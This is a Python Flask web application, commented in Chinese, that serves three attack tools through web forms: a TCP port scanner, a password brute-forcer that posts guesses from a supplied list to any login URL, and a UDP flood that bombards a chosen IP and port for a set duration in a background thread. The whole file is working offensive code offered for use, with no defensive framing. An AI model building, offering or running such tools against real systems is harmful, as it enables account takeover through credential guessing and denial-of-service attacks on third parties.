from flask import Flask, request, render_template, jsonify
import socket
import threading
import requests
import time

app = Flask(__name__)

# 1. 端口扫描功能
# 端口扫描函数，传入主机和端口列表，返回开放的端口列表
def port_scan(host, ports):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                result = s.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
        except Exception as e:
            pass
    return open_ports

# 端口扫描路由，访问/port_scan，先返回port_scan.html页面\
# 然后通过POST请求进行端口扫描，最后将扫描结果通过JSON返回
@app.route('/port_scan', methods=['GET', 'POST'])
def port_scan_route():
    if request.method == 'POST':
        host = request.form.get('host')
        ports = range(100, 500)
        open_ports = port_scan(host, ports)
        return jsonify({'host': host, 'open_ports': open_ports})
    return render_template('port_scan.html')

# 2. 密码爆破功能
def brute_force_login(url, username, password_list):
    for password in password_list:
        try:
            response = requests.post(url, data={'username': username, 'password': password}, timeout=2)
            print(f"Trying password: {password}")
            print(f"Status Code: {response.status_code}")
            print(response.text)
            if 'login success' in response.text:
                return password
        except Exception as e:
            pass
    return None

@app.route('/brute_force', methods=['GET', 'POST'])
def brute_force_route():
    if request.method == 'POST':
        url = request.form.get('url')
        username = request.form.get('username')
        passwords = request.form.get('passwords').splitlines()
        password = brute_force_login(url, username, passwords)
        return jsonify({'url': url, 'username': username, 'password_found': password})
    return render_template('brute_force.html')

# 3. 泛洪攻击功能
def flood_attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'Flood', (target_ip, target_port))

@app.route('/flood_attack', methods=['GET', 'POST'])
def flood_attack_route():
    if request.method == 'POST':
        target_ip = request.form.get('target_ip')
        target_port = int(request.form.get('target_port'))
        duration = int(request.form.get('duration'))
        threading.Thread(target=flood_attack, args=(target_ip, target_port, duration)).start()
        return jsonify({'target_ip': target_ip, 'target_port': target_port, 'duration': duration})
    return render_template('flood_attack.html')

# 首页路由
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
